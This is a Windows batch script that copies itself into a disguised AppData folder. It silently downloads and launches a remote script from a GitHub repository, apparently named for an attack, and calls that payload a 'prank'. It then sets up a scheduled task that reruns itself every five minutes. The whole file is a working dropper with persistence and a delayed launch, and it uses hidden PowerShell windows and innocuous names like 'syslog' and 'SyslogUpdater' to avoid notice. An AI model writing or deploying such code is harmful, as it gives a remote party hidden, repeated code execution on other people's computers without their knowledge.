@echo off
setlocal enabledelayedexpansion

:: ===================================================================
:: CONFIGURATION – change these values as needed
:: ===================================================================
set "DELAY=600"                     & REM seconds before first run (600 = 10 min)
set "UPDATER_INTERVAL=5"             & REM minutes between updater runs

set "BASE=%APPDATA%\SysCache"
set "UPDATER=%BASE%\updater.cmd"
set "PRANK=%BASE%\syslog.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
set "REMOTE_VER=%TEMP%\rv.txt"
set "DOWNLOAD=%TEMP%\sn.cmd"
set "FIRSTRUN_FLAG=%BASE%\firstrun.txt"

if not exist "%BASE%" mkdir "%BASE%"

:: Copy this updater to the base folder (if not already there)
if /i not "%~f0"=="%UPDATER%" (
    copy /Y "%~f0" "%UPDATER%" >nul
)

:: Download remote version
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch {}" >nul 2>&1
if not exist "%REMOTE_VER%" goto RUN

set /p REMOTE=<"%REMOTE_VER%"
if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"

if not "%LOCAL%"=="%REMOTE%" (
    powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD%' -ErrorAction Stop } catch {}" >nul 2>&1
    if exist "%DOWNLOAD%" (
        move /Y "%DOWNLOAD%" "%PRANK%" >nul
        echo %REMOTE% > "%LOCAL_VER%"

        :: Calculate the exact start time (current time + DELAY seconds) and store it
        for /f "usebackq delims=" %%a in (`powershell -Command "(Get-Date).AddSeconds(%DELAY%).ToString('yyyy-MM-dd HH:mm:ss')"`) do set "TARGET=%%a"
        echo %TARGET% > "%FIRSTRUN_FLAG%"
    )
)

:RUN
:: If this is a first run (flag exists), check whether the target time has been reached
if exist "%FIRSTRUN_FLAG%" (
    set /p TARGET=<"%FIRSTRUN_FLAG%"
    :: Compare current time with the stored target using PowerShell
    powershell -Command "if ((Get-Date) -ge [datetime]'%TARGET%') { exit 0 } else { exit 1 }"
    if !errorlevel! equ 0 (
        start "" "%PRANK%"
        del "%FIRSTRUN_FLAG%"
    )
)

:: Create / update the scheduled task to run this updater every UPDATER_INTERVAL minutes
schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo %UPDATER_INTERVAL% /f >nul 2>&1

endlocal